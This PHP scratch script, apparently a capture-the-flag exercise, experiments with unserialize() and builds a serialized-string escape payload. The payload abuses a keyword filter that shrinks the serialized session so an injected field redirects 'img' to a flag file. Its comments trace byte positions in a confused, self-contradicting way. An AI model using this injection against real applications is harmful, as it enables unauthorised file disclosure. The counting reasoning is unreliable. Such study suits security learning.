<?php
// I think I need to understand PHP's unserialize behavior better.
// 
// Let me test what happens when we have a valid serialized string but with extra content

// Valid serialized string
$valid = 's:4:"test";';
echo "Valid: $valid\n";
$result = unserialize($valid);
echo "Result: ";
var_dump($result);
echo "\n";

// Valid serialized string with extra content after
$valid_extra = 's:4:"test";extra';
echo "Valid with extra: $valid_extra\n";
$result2 = @unserialize($valid_extra);
echo "Result: ";
var_dump($result2);
echo "\n";

// Valid serialized array
$valid_array = 'a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}';
echo "Valid array: $valid_array\n";
$result3 = unserialize($valid_array);
echo "Result: ";
var_dump($result3);
echo "\n";

// Array with extra content after
$valid_array_extra = 'a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}extra';
echo "Array with extra: $valid_array_extra\n";
$result4 = @unserialize($valid_array_extra);
echo "Result: ";
var_dump($result4);
echo "\n";

// Now let me test the shrinking case
// 
// The key insight: when the filter removes keywords, the serialized length is LARGER than actual
// 
// For example:
// Original: s:4:"flag"
// After filter: s:4:"" (but the quotes are still there!)
// 
// Wait, I think I see the issue. The filter removes 'flag' from the CONTENT, not from the quotes.
// 
// So we have:
// s:4:"flag" -> s:4:""
// 
// The CONTENT is now empty (0 bytes), but the length says 4.
// 
// PHP's unserialize will try to read 4 bytes from the position after the opening quote.
// But the position after the opening quote is the closing quote!
// 
// So PHP reads: " (closing quote) as the first byte of CONTENT.
// Then it reads more bytes until it has 4 bytes.
// 
// Let me trace through:
// s:4:""
// 
// Position 0: s
// Position 1: :
// Position 2: 4
// Position 3: :
// Position 4: " (opening quote)
// Position 5: " (closing quote)
// Position 6: ;
// 
// PHP reads 4 bytes starting from position 5 (after the opening quote).
// Position 5: " (closing quote)
// Position 6: ;
// Position 7: ? (next content)
// Position 8: ?
// 
// But wait, position 6 is the semicolon, which is part of the serialized format!
// So PHP reads: " (5), ; (6), and then 2 more bytes from whatever comes next.
// 
// This is the key! PHP reads past the closing quote and semicolon!

// Let me test this
$test = 's:4:"";s:8:"function"';
echo "Test: $test\n";
echo "Positions:\n";
for ($i = 0; $i < strlen($test); $i++) {
    echo "$i: '" . $test[$i] . "'\n";
}
echo "\n";

// PHP reads 4 bytes from position 5:
// Position 5: "
// Position 6: ;
// Position 7: s
// Position 8: :
// 
// CONTENT = ";s:
// 
// Then PHP expects closing quote at position 9
// Position 9: 8
// Error!

// So the trick is to make the "overflow" read content that ends with a closing quote!
// 
// If we have:
// s:N:"";...
// 
// And N is chosen so that the overflow reads exactly up to a closing quote,
// then PHP will see the closing quote and continue parsing!

// Let me think about this:
// 
// We want to inject: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// 
// The structure after the empty string is:
// ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// 
// If we can make PHP read exactly up to the position before the closing quote of our injected img value,
// then PHP will see the closing quote and continue!

// Hmm, this is getting complicated. Let me try a different approach.

// Actually, I think the key insight is:
// When the filter SHRINKS the string, the serialized length is LARGER than actual.
// PHP reads past the closing quote and semicolon, treating them as part of the CONTENT.
// 
// After reading N bytes, PHP expects a closing quote.
// If the N bytes end with a closing quote, PHP will see it and continue!
// 
// So we need to craft the payload so that the N bytes end with a closing quote.

// For example:
// user = 'flag' + '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// 
// Serialized: s:45:"flag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// After filter: s:45:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// PHP reads 45 bytes from position after opening quote:
// Position after opening quote: " (closing quote of empty string)
// 
// Content: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"function"...
// 
// First 45 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"f
// 
// The 45th byte is: f
// PHP expects closing quote, but sees u (from "unction")
// Error!

// We need the 45th byte to be a closing quote!
// 
// Let me adjust the payload:
// user = 'flag' + '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";' + padding
// 
// Where padding is chosen so that the 45th byte is a closing quote.

// Actually, let me think about this more carefully.
// 
// The injection: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// Length: 41 bytes
// 
// After filter removes 'flag' (4 bytes), we have 41 bytes.
// Serialized length: 45 bytes.
// 
// PHP reads 45 bytes from the 41-byte content.
// PHP reads: 41 bytes of content + 4 bytes from next field.
// 
// The next field is: ";s:8:"function"...
// PHP reads: ";s: (4 bytes)
// 
// Total: 41 + 4 = 45 bytes
// 
// The 45th byte is: : (from ";s:)
// PHP expects closing quote, but sees 8 (from "8:function")
// Error!

// So we need to adjust the payload so that the 45th byte is a closing quote.
// 
// The 45th byte is the last byte of the 45-byte read.
// We want this to be a closing quote.
// 
// The content after the empty string is:
// ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"function"...
// 
// We want the 45th byte to be a closing quote.
// 
// Let me count:
// ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// Position 0: "
// Position 1: ;
// ...
// Position 40: }
// 
// That's 41 bytes.
// 
// If we read 45 bytes, we read 41 bytes from the injection + 4 bytes from the next field.
// The next field is: ";s:8:"function"...
// 
// Position 41: " (closing quote of injection)
// Position 42: ;
// Position 43: s
// Position 44: :
// 
// So the 45th byte (position 44) is: :
// 
// We want the 45th byte to be a closing quote.
// 
// Let me adjust the injection:
// ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}" (add a closing quote at the end)
// 
// Wait, that would make the injection 42 bytes.
// 
// Let me recalculate:
// Injection: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// Length: 42 bytes
// 
// user = 'flag' + injection = 4 + 42 = 46 bytes
// 
// After filter: 42 bytes
// 
// Serialized: s:46:"flag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// After filter: s:46:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// PHP reads 46 bytes from position after opening quote:
// Content: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"function"...
// 
// First 46 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"fu
// 
// The 46th byte is: u
// PHP expects closing quote, but sees n (from "nction")
// Error!

// This is getting tedious. Let me just try different payloads and see which one works.

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

// Try different payloads
for ($i = 40; $i <= 50; $i++) {
    $injection = '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';
    $padding = str_repeat('X', $i - strlen($injection));
    $payload = 'flag' . $padding . $injection;
    
    $_SESSION = [];
    $_SESSION['user'] = $payload;
    $_SESSION['function'] = 'show_image';
    $_SESSION['img'] = 'Z3Vlc3RfaW1nLnBuZw==';
    
    $serialized = serialize($_SESSION);
    $filtered = filter($serialized);
    
    echo "=== i=$i ===\n";
    echo "Payload length: " . strlen($payload) . "\n";
    echo "Filtered user value length: " . (strlen($payload) - 4) . "\n";
    
    $result = @unserialize($filtered);
    if ($result !== false) {
        echo "SUCCESS!\n";
        var_dump($result);
        break;
    } else {
        echo "Failed\n";
    }
    echo "\n";
}

